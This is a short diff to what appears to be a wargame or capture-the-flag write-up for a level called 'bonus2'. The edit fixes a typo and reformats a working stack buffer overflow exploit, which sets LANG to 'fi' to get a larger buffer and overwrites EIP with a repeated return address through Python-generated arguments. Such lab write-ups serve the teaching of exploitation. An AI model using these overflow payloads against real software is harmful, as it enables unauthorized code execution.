@@ -21,8 +21,8 @@ Stack level 0, frame at 0xbffff0e0:
 (gdb)
 We see that the eip is rewrite but to half.
 
-To rewrite the eip in full we have to change the "LANG" in fi or nl because the buffer is bugger so we can write more.
+To rewrite the eip in full we have to change the "LANG" in fi or nl because the buffer is bigger so we can write more.
 
- export LANG="fi"
-
- exploit : ./bonus2 `python -c 'print "z"*500'` `python -c 'print "aa" + "\xdc\xf7\xff\xbf"*30'`
+Exploit:
+export LANG="fi"
+./bonus2 `python -c 'print "z"*500'` `python -c 'print "aa" + "\xdc\xf7\xff\xbf"*30'`
